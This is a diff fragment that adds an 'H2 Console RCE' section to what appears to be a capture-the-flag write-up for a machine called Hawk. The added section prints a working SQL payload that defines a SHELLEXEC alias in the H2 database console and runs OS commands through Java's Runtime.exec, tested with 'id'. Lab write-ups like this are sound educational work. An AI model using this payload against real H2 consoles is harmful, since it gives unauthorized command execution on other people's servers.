@@ -556,3 +556,24 @@ But searching in Google, we discovery that if we change the /test of the JDBC UR
 ![10](../../../assets/images/Hawk/10.png)
 
 <br />
+
+# H2 Console RCE:
+
+<br />
+
+Continue searching in Google, discover a [website](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html) that explain us how to execute commands in the H2 Console using the following Payload:
+
+<br />
+
+```sql 
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
+CALL SHELLEXEC('id')
+```
+
+<br />
+
+Try to execute a command and let's go, we do it!!
+
+<br />
+
+
